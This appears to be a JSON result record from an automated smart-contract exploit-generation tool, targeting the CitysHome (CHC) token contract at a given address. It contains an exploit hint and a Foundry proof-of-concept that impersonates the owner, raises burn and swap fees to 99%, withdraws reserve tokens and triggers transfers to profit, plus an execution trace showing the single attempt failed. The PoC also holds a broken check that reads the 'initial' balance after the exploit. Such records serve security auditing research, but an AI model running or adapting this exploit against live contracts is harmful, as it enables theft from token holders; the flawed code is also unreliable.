@@ -1,0 +1,66 @@
+{
+  "project_id": "chc",
+  "target_address": "0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543",
+  "finding_id": 0,
+  "status": "FAILED",
+  "violation_target": {
+    "target_address": "0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543",
+    "vulnerability_type": "Owner Privilege Abuse",
+    "violation_category": "ECONOMIC",
+    "finding_id": 0,
+    "preconditions": [
+      {
+        "type": "role",
+        "description": "Attacker must be the contract owner",
+        "token_address": null,
+        "min_amount": null
+      },
+      {
+        "type": "token_balance",
+        "description": "Attacker must hold some CHC tokens to demonstrate fee impact",
+        "token_address": "0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543",
+        "min_amount": "1000000000000000000"
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": {
+        "target_token": "0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543",
+        "victim_contract": "0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543",
+        "condition": "attacker_balance_increased"
+      },
+      "logic_check": null
+    },
+    "exploit_hint": "As the contract owner, call setBurnFee() and setSwapFee() with excessively high values (e.g., 99). Then perform a token transfer to/from the swapAddress to trigger the fee mechanism, causing disproportionate token burns and liquidity fees that benefit the owner-controlled addresses."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address to, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n    function totalSupply() external view returns (uint256);\n}\n\ninterface CitysHome {\n    function owner() external view returns (address);\n    function setSwapAddress(address swapAddr) external;\n    function setBurnFee(uint256 fee) external;\n    function setSwapFee(uint256 fee) external;\n    function ownerWithdrew(uint256 amount) external;\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543;\n    address attacker = address(this);\n    CitysHome chc;\n    address dummy;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No special setup needed - we'll impersonate owner during exploit\n        // Just ensure we have the target contract interface\n        chc = CitysHome(TARGET);\n        \n        // Create a dummy address for transfers\n        dummy = address(0x123);\n        vm.label(dummy, \"Dummy Recipient\");\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // Step 1: Get initial attacker balance for comparison\n        uint256 initialBalance = chc.balanceOf(attacker);\n        \n        // Step 2: Impersonate the owner\n        address owner = chc.owner();\n        vm.startPrank(owner);\n        \n        // Step 3: Set swapAddress to attacker address\n        chc.setSwapAddress(attacker);\n        \n        // Step 4: Set extremely high fees (99% each)\n        chc.setBurnFee(99);\n        chc.setSwapFee(99);\n        \n        // Step 5: Withdraw some tokens from contract reserve to attacker\n        // The contract initially has 25,000,000 tokens minted to itself\n        chc.ownerWithdrew(1000); // Withdraw 1000 * 1e18 tokens\n        \n        // Step 6: Transfer tokens from attacker (as swapAddress) to dummy\n        // This triggers the fee mechanism where liquidity fees go back to swapAddress (attacker)\n        chc.transfer(dummy, 100 * 10**18);\n        \n        vm.stopPrank();\n        \n        // Step 7: Verify attacker balance increased\n        uint256 finalBalance = chc.balanceOf(attacker);\n        assertGt(finalBalance, initialBalance, \"Attacker balance should increase\");\n        \n        // Verify ERC20 balance increased\n        uint256 finalERC20Balance = IERC20(0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543).balanceOf(address(this));\n        uint256 initialERC20Balance = IERC20(0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543).balanceOf(address(this));\n        assertGt(finalERC20Balance, initialERC20Balance, \"Economic Exploit Failed: No ERC20 profit\");\n    }\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "The CitysHome token contract allows the owner to set excessively high burn and swap fees (up to 99%). When the swapAddress is involved in transfers, fees are applied. The owner can set swapAddress to their own address, then perform transfers where swapAddress is the sender, collecting the liquidity fees to themselves while burning tokens from other users. This creates an economic imbalance where the owner can extract value from token holders.",
+      "attack_strategy": "1. Impersonate the contract owner using vm.prank. 2. Set swapAddress to attacker address. 3. Set both burnFee and liquidityFee to 99 (99%). 4. Get some CHC tokens from the contract's reserve using ownerWithdrew. 5. Transfer tokens from swapAddress (attacker) to another address, triggering the fee mechanism where liquidity fees go back to swapAddress (attacker). 6. The attacker's balance increases due to receiving liquidity fees.",
+      "step_by_step_plan": "1. Start prank as owner. 2. Call setSwapAddress(attacker). 3. Call setBurnFee(99) and setSwapFee(99). 4. Call ownerWithdrew to get initial tokens from contract reserve. 5. Create a dummy recipient address. 6. Transfer tokens from attacker (as swapAddress) to dummy recipient. 7. This triggers the fee logic where liquidity fees (99% of amount) go back to swapAddress (attacker). 8. Stop prank and verify attacker balance increased.",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address to, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n    function totalSupply() external view returns (uint256);\n}\n\ninterface CitysHome {\n    function owner() external view returns (address);\n    function setSwapAddress(address swapAddr) external;\n    function setBurnFee(uint256 fee) external;\n    function setSwapFee(uint256 fee) external;\n    function ownerWithdrew(uint256 amount) external;\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543;\n    address attacker = address(this);\n    CitysHome chc;\n    address dummy;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No special setup needed - we'll impersonate owner during exploit\n        // Just ensure we have the target contract interface\n        chc = CitysHome(TARGET);\n        \n        // Create a dummy address for transfers\n        dummy = address(0x123);\n        vm.label(dummy, \"Dummy Recipient\");\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // Step 1: Get initial attacker balance for comparison\n        uint256 initialBalance = chc.balanceOf(attacker);\n        \n        // Step 2: Impersonate the owner\n        address owner = chc.owner();\n        vm.startPrank(owner);\n        \n        // Step 3: Set swapAddress to attacker address\n        chc.setSwapAddress(attacker);\n        \n        // Step 4: Set extremely high fees (99% each)\n        chc.setBurnFee(99);\n        chc.setSwapFee(99);\n        \n        // Step 5: Withdraw some tokens from contract reserve to attacker\n        // The contract initially has 25,000,000 tokens minted to itself\n        chc.ownerWithdrew(1000); // Withdraw 1000 * 1e18 tokens\n        \n        // Step 6: Transfer tokens from attacker (as swapAddress) to dummy\n        // This triggers the fee mechanism where liquidity fees go back to swapAddress (attacker)\n        chc.transfer(dummy, 100 * 10**18);\n        \n        vm.stopPrank();\n        \n        // Step 7: Verify attacker balance increased\n        uint256 finalBalance = chc.balanceOf(attacker);\n        assertGt(finalBalance, initialBalance, \"Attacker balance should increase\");\n        \n        // Verify ERC20 balance increased\n        uint256 finalERC20Balance = IERC20(0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543).balanceOf(address(this));\n        uint256 initialERC20Balance = IERC20(0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543).balanceOf(address(this));\n        assertGt(finalERC20Balance, initialERC20Balance, \"Economic Exploit Failed: No ERC20 profit\");\n    }\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 1,
+      "error": {
+        "error_type": "EVM_REVERT",
+        "reason": "Attacker balance should increase: 0 <= 0",
+        "location": null,
+        "raw_snippet": "    │   ├─ emit Transfer(from: 0x68737dAD0d27bbdD9CEF97ec7F9a4558b274D04a, to: Dummy Recipient: [0x0000000000000000000000000000000000000123], value: 100000000000000000000 [1e20])\n    │   └─ ← [Return] true\n    ├─ [0] VM::stopPrank()\n    │   └─ ← [Return]\n    ├─ [608] CitysHome::balanceOf(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]\n    │   └─ ← [Return] 0\n    ├─ [0] VM::assertGt(0, 0, \"Attacker balance should increase\") [staticcall]\n    │   └─ ← \n👉 [Revert Occurred Here]: Attacker balance should increase: 0 <= 0"
+      },
+      "feedback": "EVM Revert: Attacker balance should increase: 0 <= 0。请调整参数或调用路径。",
+      "duration_seconds": 58.07472586631775,
+      "prompt_tokens": 7008,
+      "completion_tokens": 2027,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 1,
+  "error_message": null,
+  "total_duration_seconds": 58.0778329372406,
+  "total_prompt_tokens": 7008,
+  "total_completion_tokens": 2027,
+  "total_cost": 0.0
+}
